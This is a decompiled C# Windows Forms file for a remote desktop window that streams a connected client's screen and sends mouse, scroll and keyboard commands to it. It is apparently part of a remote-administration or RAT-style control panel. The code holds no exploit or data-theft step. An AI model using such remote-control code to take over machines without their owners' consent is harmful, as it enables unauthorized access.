using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000A9 RID: 169
	public partial class FormDesktop : FormMaterial
	{
		// Token: 0x0600050C RID: 1292 RVA: 0x00046FCC File Offset: 0x000451CC
		public FormDesktop()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x0600050D RID: 1293 RVA: 0x0004701C File Offset: 0x0004521C
		private void FormDesktop_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
			this.pictureBox1.MouseMove += this.pictureBox1_MouseMove;
			this.pictureBox1.MouseDown += this.pictureBox1_MouseDown;
			this.pictureBox1.MouseUp += this.pictureBox1_MouseUp;
			this.pictureBox1.MouseWheel += this.PictureBox_MouseWheel;
			base.KeyPreview = true;
			this.pictureBox1.Focus();
			base.KeyDown += this.FormRemoteDesktop_KeyDown;
			base.KeyUp += this.FormRemoteDesktop_KeyUp;
		}

		// Token: 0x0600050E RID: 1294 RVA: 0x000470E4 File Offset: 0x000452E4
		private void ChangeScheme(object sender)
		{
			this.numericUpDown2.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x0600050F RID: 1295 RVA: 0x000470F6 File Offset: 0x000452F6
		private void Closing1(object sender, EventArgs e)
		{
			if (this.client != null)
			{
				this.client.Disconnect();
			}
		}

		// Token: 0x06000510 RID: 1296 RVA: 0x0004710C File Offset: 0x0004530C
		private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.materialSwitch1.Checked)
			{
				this.client.Send(new object[]
				{
					"Capture",
					true,
					(byte)this.numericUpDown2.Value,
					this.materialSwitch4.Checked
				});
				return;
			}
			this.client.Send(new object[]
			{
				"Capture",
				false
			});
		}

		// Token: 0x06000511 RID: 1297 RVA: 0x00047196 File Offset: 0x00045396
		private void numericUpDown2_ValueChanged(object sender, EventArgs e)
		{
			if (this.materialSwitch1.Checked)
			{
				this.client.Send(new object[]
				{
					"Quality",
					(byte)this.numericUpDown2.Value
				});
			}
		}

		// Token: 0x06000512 RID: 1298 RVA: 0x000471D6 File Offset: 0x000453D6
		private void materialSwitch4_CheckedChanged(object sender, EventArgs e)
		{
			if (this.materialSwitch1.Checked)
			{
				this.client.Send(new object[]
				{
					"Sharpdx",
					this.materialSwitch4.Checked
				});
			}
		}

		// Token: 0x06000513 RID: 1299 RVA: 0x00047214 File Offset: 0x00045414
		private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.materialSwitch1.Checked && this.materialSwitch2.Checked)
				{
					new Point(e.X * this.screen.Width / this.pictureBox1.Width, e.Y * this.screen.Height / this.pictureBox1.Height);
					byte b = 0;
					if (e.Button == MouseButtons.Left)
					{
						b = 2;
					}
					if (e.Button == MouseButtons.Right)
					{
						b = 8;
					}
					this.client.Send(new object[]
					{
						"MouseClick",
						b
					});
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000514 RID: 1300 RVA: 0x000472DC File Offset: 0x000454DC
		private void PictureBox_MouseWheel(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.materialSwitch1.Checked && this.materialSwitch2.Checked)
				{
					int delta = e.Delta;
					this.client.Send(new object[]
					{
						"MouseScroll",
						delta
					});
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000515 RID: 1301 RVA: 0x00047344 File Offset: 0x00045544
		private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.materialSwitch1.Checked && this.materialSwitch2.Checked)
				{
					new Point(e.X * this.screen.Width / this.pictureBox1.Width, e.Y * this.screen.Height / this.pictureBox1.Height);
					byte b = 0;
					if (e.Button == MouseButtons.Left)
					{
						b = 4;
					}
					if (e.Button == MouseButtons.Right)
					{
						b = 16;
					}
					this.client.Send(new object[]
					{
						"MouseClick",
						b
					});
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000516 RID: 1302 RVA: 0x0004740C File Offset: 0x0004560C
		private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.materialSwitch1.Checked && this.materialSwitch2.Checked)
				{
					Point point = new Point(e.X * this.screen.Width / this.pictureBox1.Width, e.Y * this.screen.Height / this.pictureBox1.Height);
					if (Math.Abs(point.X - this.point2.X) >= 15 || Math.Abs(point.Y - this.point2.Y) >= 15)
					{
						this.point2 = point;
						this.client.Send(new object[]
						{
							"MouseMove",
							point.X,
							point.Y
						});
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000517 RID: 1303 RVA: 0x00047508 File Offset: 0x00045708
		private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
		{
			if (!this.materialSwitch1.Checked || !this.materialSwitch3.Checked)
			{
				return;
			}
			if (!this.IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			if (this._keysPressed.Contains(e.KeyCode))
			{
				return;
			}
			this._keysPressed.Add(e.KeyCode);
			this.client.Send(new object[]
			{
				"KeyboardClick",
				true,
				(int)e.KeyCode
			});
		}

		// Token: 0x06000518 RID: 1304 RVA: 0x0004759C File Offset: 0x0004579C
		private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
		{
			if (!this.materialSwitch1.Checked || !this.materialSwitch3.Checked)
			{
				return;
			}
			if (!this.IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			this._keysPressed.Remove(e.KeyCode);
			this.client.Send(new object[]
			{
				"KeyboardClick",
				false,
				(int)e.KeyCode
			});
		}

		// Token: 0x06000519 RID: 1305 RVA: 0x0004761B File Offset: 0x0004581B
		private bool IsLockKey(Keys key)
		{
			return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
		}

		// Token: 0x0600051A RID: 1306 RVA: 0x00047643 File Offset: 0x00045843
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client != null && !this.client.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x040003A9 RID: 937
		public int FPS;

		// Token: 0x040003AA RID: 938
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x040003AB RID: 939
		private List<Keys> _keysPressed = new List<Keys>();

		// Token: 0x040003AC RID: 940
		public Size screen;

		// Token: 0x040003AD RID: 941
		public Clients client;

		// Token: 0x040003AE RID: 942
		public Clients parrent;

		// Token: 0x040003AF RID: 943
		private Point point2 = new Point(0, 0);

		// Token: 0x040003B0 RID: 944
		private const int threshold = 15;
	}
}
